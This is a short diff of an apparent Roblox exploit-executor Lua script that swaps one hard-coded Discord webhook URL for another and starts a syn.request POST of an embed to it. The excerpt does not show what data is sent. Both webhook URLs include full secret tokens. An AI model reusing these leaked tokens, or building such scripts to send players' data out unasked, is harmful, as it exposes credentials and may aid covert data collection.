@@ -66,7 +66,7 @@ local embed = {
     }}
 }
 
-local webhook = "https://discord.com/api/webhooks/1380209575994724373/GR_QyyoymDxRQy7S0dZVUdxHKj-bkGoNTQl70c4sLMn17yEz7xH9nlZQ47fK7b0jKsX9"
+local webhook = "https://discord.com/api/webhooks/1454017474956628020/jmMTU6luLVwzYg68F0Jq26kXcNZTqt24S1UGoYOLjkuxVSt9egYDdsO9rOXvoZbJYj5L"
 syn.request({
     Url = webhook,
     Method = "POST",
